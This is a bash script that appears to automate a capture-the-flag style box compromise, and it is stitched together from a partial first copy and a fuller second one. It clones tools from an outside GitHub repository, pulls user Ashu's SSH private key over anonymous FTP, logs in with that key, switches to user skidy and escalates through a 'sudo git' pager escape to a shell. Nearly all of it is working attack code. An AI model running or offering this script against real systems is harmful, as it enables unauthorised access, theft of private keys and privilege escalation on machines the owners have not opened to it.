#!/bin/bash

# Prompt for IP address
read -p "Enter the IP address: " ip_address

# Basic enumeration to obtain Ashu's password/ssh id_rsa key
echo "Cloning tools to take over"
if ! sudo git clone https://github.com/Le-Bullwhale/deploy.git; then
echo "failed to deploy tools"
exit 1
fi 
sleep 4
# Connect to the machine as user Ashu and download id_rsa file
echo "Connecting to $ip_address as user ftp and downloading id_rsa..."
if ! ftp -n "$ip_address" << EOF
user ftp
get id_rsa
quit
EOF
then
  echo "Failed to connect as user ftp or download id_rsa file."
  exit 1
fi
sleep 4
# Change id_rsa permissions to 600
echo "Changing id_rsa permissions to 600..."
if ! chmod 600 id_rsa; then
  echo "Failed to change id_rsa permissions."
  exit 1
fi
#!/bin/bash

# Prompt for IP address
read -p "Enter the IP address: " ip_address

# Basic enumeration to obtain Ashu's password/ssh id_rsa key
echo "Basic enumeration in progress..."
if ! nmap -p 22 --script ssh2-enum-algos "$ip_address"; then
  echo "Failed to perform basic enumeration."
  exit 1
fi
sleep 4

# Connect to the machine as user Ashu and download id_rsa file
echo "Connecting to $ip_address as user ftp and downloading id_rsa..."
if ! ftp -n "$ip_address" << EOF
user ftp
get id_rsa
quit
EOF
then
  echo "Failed to connect as user ftp or download id_rsa file."
  exit 1
fi
sleep 4

# Change id_rsa permissions to 600
echo "Changing id_rsa permissions to 600..."
if ! chmod 600 id_rsa; then
  echo "Failed to change id_rsa permissions."
  exit 1
fi

# Connect to SSH using id_rsa and execute commands remotely
echo "Connecting to $ip_address using id_rsa key and executing commands..."
if ! ssh -i id_rsa ashu@"$ip_address" << EOF
echo "Executing remote command 1"
ls
echo "Executing remote command 2"
whoami
echo "elevating privs"
sudo su skidy
sudo git -p help config
!/bin/sh
EOF
then
  echo "Failed to connect using id_rsa key or execute remote commands."
  exit 1
fi
sleep 4

echo "Script execution completed."
